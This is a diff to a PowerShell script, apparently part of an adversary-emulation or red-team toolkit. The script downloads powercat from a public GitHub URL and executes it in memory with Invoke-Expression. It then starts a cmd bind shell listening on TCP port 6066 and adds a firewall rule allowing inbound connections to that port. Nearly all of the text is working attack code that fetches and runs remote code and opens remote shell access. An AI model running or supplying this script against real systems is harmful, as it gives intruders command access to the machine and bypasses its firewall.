@@ -9,7 +9,7 @@ Write-Output "==================================================================
 $Ps1ScriptToUse = @("powercat.ps1")
 $ExecuteFrom = "https://raw.githubusercontent.com/besimorhino/powercat/master"
 $ListeningTcpPort= "6066"
-$PwCatParameters = " -l -p 6066 -e cmd -ge"
+$PwCatParameters = " -l -p "+$ListeningTcpPort+" -e cmd -ge"
 ################ [ GLOBAL VARIABLES ] ################
 $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
 $LogFile = "$env:PUBLIC\exf\Tool_PowerCat.txt";
@@ -22,7 +22,9 @@ Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
 foreach ($Tool in $Ps1ScriptToUse) 
 {
     $DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
-    $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
-    Invoke-Expression -Command $RemoteCode $PwCatParameters
+#    $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString($DownloadRun)
     New-NetFirewallRule -DisplayName "Allow Inbound access to port $ListeningTcpPort" -Direction Inbound -Action Allow -Protocol TCP -LocalPort $ListeningTcpPort
+    #Invoke-Expression -Command $RemoteCode $PwCatParameters
+    & powercat $PwCatParameters
   }
